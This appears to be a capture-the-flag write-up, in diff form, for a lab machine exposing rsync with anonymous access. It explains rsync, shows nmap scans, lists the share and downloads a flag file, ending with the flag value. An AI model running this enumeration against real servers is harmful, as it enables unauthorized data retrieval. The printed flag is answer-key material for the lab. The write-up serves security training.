@@ -1,1 +1,75 @@
+The best known file transfer service is the File Transfer Protocol (FTP), which was covered thoroughly
+in the Fawn machine. The main concern with FTP is that it is a very old and slow protocol. FTP is a protocol
+used for copying entire files over the network from a remote server. In many cases there is a need to
+transfer only some changes made to a few files and not to transfer every file every single time. For these
+scenarios, the rsync protocol is generally preferred.
+The changes that need to get transfered are called deltas. Using deltas to update files is an extremely
+efficient way to reduce the required bandwidth for the transfer as well as the required time for the transfer
+to complete.
+The official definition of rsync according to the Linux manual page is:
 
+Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally,
+to/from another host over any remote shell, or to/from a remote rsync daemon. It offers
+a large number of options that control every aspect of its behavior and permit very
+flexible specification of the set of files to be copied. It is famous for its deltatransfer algorithm, which reduces the amount of data sent over the network by sending
+only the differences between the source files and the existing files in the
+destination. Rsync is widely used for backups and mirroring and as an improved copy
+command for everyday use.
+
+It follows directly from the definition of rsync that it's a great tool for creating/maintaining backups and
+keeping remote machines in sync with each other. Both of these functionalities are commonly implemented
+in corporate environment. In these environments time is of of the most importance, so rsync is preferred
+due to the speedup it offers for these tasks.
+The main stages of an rsync transfer are the following:
+1. rsync establishes a connection to the remote host and spawns another rsync receiver process.
+2. The sender and receiver processes compare what files have changed.
+3. What has changed gets updated on the remote host.
+It often happens that rsync is misconfigured to permit anonymous login, which can be exploited by an
+attacker to get access to sensitive information stored on the remote machine. Synced is a Linux box that
+exposes a directory over rsync with anonymous login. We are able to remotely access this directory using
+the command line tool rsync and retrieve the flag.
+
+The generic syntax used by rsync is the following:
+> rsync [OPTION] … [USER@]HOST::SRC [DEST]
+
+# What is the default port for rsync?
+> 873
+
+# How many TCP ports are open on the remote host?
+> nmap -sT -T5 10.129.228.37 
+  Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 05:48 EDT
+  Nmap scan report for 10.129.228.37
+  Host is up (0.030s latency).
+  Not shown: 999 closed tcp ports (conn-refused)
+  PORT    STATE SERVICE
+  873/tcp open  rsync
+
+# What is the protocol version used by rsync on the remote machine?
+> nmap -sV -p 873 10.129.228.37
+  Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 05:52 EDT
+  Nmap scan report for 10.129.228.37
+  Host is up (0.030s latency).
+  
+  PORT    STATE SERVICE VERSION
+  873/tcp open  rsync   (protocol version 31)
+
+# What is the most common command name on Linux to interact with rsync?
+> rsync
+
+# What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync
+> None
+
+# What is the option to only list shares and files on rsync? (No need to include the leading -- characters)
+> list-only
+
+# Submit root flag
+> rsync --list-only {remote_ip}::
+  public          Anonymous Share
+
+> rsync --list-only {remote_ip}::public
+  drwxr-xr-x          4,096 2022/10/24 18:02:23 .
+  -rw-r--r--             33 2022/10/24 17:32:03 flag.txt
+
+> rsync 10.129.228.37::public/flag.txt flag.txt //downloaded the file
+> cat flag.txt
+@ 72eaf5344ebb84908ae543a719830519
